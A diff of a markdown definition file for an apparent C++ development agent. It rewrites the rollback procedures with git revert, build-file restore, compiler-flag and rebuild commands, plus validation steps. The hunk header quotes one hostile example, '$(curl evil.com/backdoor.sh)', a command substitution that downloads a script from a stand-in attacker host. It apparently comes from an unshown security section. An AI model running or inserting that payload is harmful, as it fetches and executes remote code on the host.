@@ -186,47 +186,79 @@ $(curl evil.com/backdoor.sh)
 
 ### Rollback Procedures
 
-If C++ build or compilation changes cause issues, rollback within <5 minutes:
+All development operations MUST have a rollback path completing in <5 minutes. This agent manages C++ development and local/staging environments.
 
-**Version Control Rollback**:
+**Source Code Rollback**:
 ```bash
-git revert HEAD --no-edit                # Revert last commit
-git revert <commit-hash> --no-edit       # Revert specific commit
-git revert HEAD~3..HEAD --no-edit        # Revert multiple commits
+# Revert code changes
+git revert HEAD --no-edit && git push origin feature-branch
+
+# Revert specific commit
+git revert <commit-hash> --no-edit
+
+# Discard uncommitted changes
+git checkout . && git clean -fd
 ```
 
 **Build Configuration Rollback**:
 ```bash
-git checkout HEAD~1 -- CMakeLists.txt    # Restore previous CMakeLists.txt
-git checkout HEAD~1 -- Makefile          # Restore previous Makefile
+# Restore previous CMakeLists.txt
+git checkout HEAD~1 -- CMakeLists.txt
+
+# Restore previous Makefile
+git checkout HEAD~1 -- Makefile
+
+# Restore compile_commands.json
 git checkout HEAD~1 -- compile_commands.json
+
+# Clean rebuild
 rm -rf build/ && mkdir build && cd build && cmake .. && make
 ```
 
-**Compiler Flag Rollback**:
+**Compiler Flags Rollback**:
 ```bash
-export CXXFLAGS="${CXXFLAGS/-O3/-O2}"           # Remove problematic optimization
-export CXXFLAGS="${CXXFLAGS/-fsanitize=address/}"  # Disable sanitizer
-make clean && make CXXFLAGS="-Wall -Wextra -O2"    # Rebuild with safe flags
+# Remove problematic optimization
+export CXXFLAGS="${CXXFLAGS/-O3/-O2}"
+
+# Disable sanitizer
+export CXXFLAGS="${CXXFLAGS/-fsanitize=address/}"
+
+# Rebuild with safe flags
+make clean && make CXXFLAGS="-Wall -Wextra -O2"
 ```
 
-**Binary Rollback**:
+**Build Artifacts Rollback**:
 ```bash
-cp build/my_program.bak build/my_program       # Restore from backup
-cp build.last/my_program build/my_program      # Restore last successful build
-git checkout HEAD~1 -- build/my_program        # Use version control
+# Restore from backup
+cp build/my_program.bak build/my_program
+
+# Restore last successful build
+cp build.last/my_program build/my_program
+
+# Clean and rebuild
+rm -rf build/ CMakeCache.txt && cmake -B build && cmake --build build
 ```
 
-**Validation Checklist**:
-- [ ] Code compiles without errors
-- [ ] All unit tests pass
-- [ ] Sanitizers report no issues (AddressSanitizer, UBSan)
-- [ ] Performance benchmarks meet baseline
-- [ ] No new compiler warnings
-- [ ] Static analysis passes (clang-tidy, cppcheck)
-- [ ] Valgrind reports no memory leaks
+**Rollback Validation**:
+```bash
+# Verify compilation
+cmake --build build
 
-**Rollback Triggers**: Compilation fails with new errors, unit tests fail after changes, sanitizers detect memory errors or undefined behavior, performance degrades by >10%, production crashes or segfaults.
+# Run unit tests
+ctest --test-dir build
+
+# Run sanitizers
+./build/my_program --run-tests
+
+# Check for memory leaks (local)
+valgrind --leak-check=full ./build/my_program
+
+# Static analysis
+clang-tidy src/*.cpp
+cppcheck --enable=all src/
+```
+
+**Note**: Production deployments are handled by deployment/infrastructure agents. This development agent manages local/dev/staging build environments only.
 
 ### Audit Logging
 
